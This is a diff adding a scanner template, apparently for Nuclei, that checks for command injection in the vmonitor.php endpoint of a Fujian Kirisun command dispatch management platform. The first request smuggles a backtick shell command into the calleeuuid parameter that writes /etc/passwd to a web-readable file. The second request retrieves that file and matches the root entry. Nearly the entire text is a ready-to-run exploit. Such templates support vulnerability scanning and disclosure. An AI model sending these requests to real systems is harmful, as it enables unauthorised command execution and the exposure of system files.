@@ -1,0 +1,40 @@
+id: poc-yaml-kirisun-vmonitor-rce
+info:
+  name: 福建科立讯通信 指挥调度管理平台 vmonitor.php命令注入漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+  description: |
+    指挥调度管理平台存在命令注入漏洞，通过特定的API路径可以执行命令或读取敏感文件。
+
+variables:
+  t1: "{{rand_int(10,100)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /api/client/vmonitor.php?extension=1&calleeuuid=`cat%20/etc/passwd>{{t1}}.txt` HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0"
+
+  - raw:
+      - |
+        GET /api/client/{{t1}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
